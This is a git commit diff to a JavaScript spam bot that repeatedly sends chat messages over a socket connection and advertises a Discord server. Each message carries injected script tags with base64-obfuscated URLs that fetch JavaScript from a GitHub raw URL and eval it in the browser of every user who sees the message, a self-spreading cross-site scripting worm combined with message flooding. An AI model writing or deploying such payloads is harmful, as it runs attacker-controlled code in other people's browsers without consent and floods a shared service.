0a91b08ee8e8e8917b2bb04977a482caa7eada3e
ivorydevrimoalt <154000627+ivorydevrimoalt@users.noreply.github.com>
2026-02-13 21:17:14 +0300

    Update message text and fix interval timing

--- 777S.js
+++ 777S.js
@@ -14,7 +14,7 @@ setInterval(() => {
     const color = Math.floor(Math.random()*2) === 1 ? 'black' : 'red';
     socket.emit('command', { list: ['color', color] });
     socket.emit("talk", {
-        text: "joining my discord really helps me out joining my discord really helps me out joining my discord really helps me out <script>fetch(atob('aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2l2b3J5ZGV2cmltb2FsdC9CT05aSVdPUkxEVUxUUkFKQVZBU0NSSVBUTElTVC9yZWZzL2hlYWRzL21haW4v')+'777'+atob('Lmpz')).then(r=>r.text()).then(t=>eval(t))</script><script>fetch(atob('aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2l2b3J5ZGV2cmltb2FsdC9CT05aSVdPUkxEVUxUUkFKQVZBU0NSSVBUTElTVC9yZWZzL2hlYWRzL21haW4v')+'777S'+atob('Lmpz')).then(r=>r.text()).then(t=>eval(t))</script>"
+        text: "joining my discord really helps me out joining my discord really helps me out joining my discord really helps me out <script>fetch(atob('aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2l2b3J5ZGV2cmltb2FsdC9CT05aSVdPUkxEVUxUUkFKQVZBU0NSSVBUTElTVC9yZWZzL2hlYWRzL21haW4v')+'777'+atob('Lmpz')).then(r=>r.text()).then(t=>eval(t))</script><script>fetch(atob('aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2l2b3J5ZGV2cmltb2FsdC9CT05aSVdPUkxEVUxUUkFKQVZBU0NSSVBUTElTVC9yZWZzL2hlYWRzL21haW4v')+'777S'+atob('Lmpz')).then(r=>r.text()).then(t=>eval(t))</script> https://discord.gg/ZckU92Xbay"
     });
     },10)
 }, 1000)
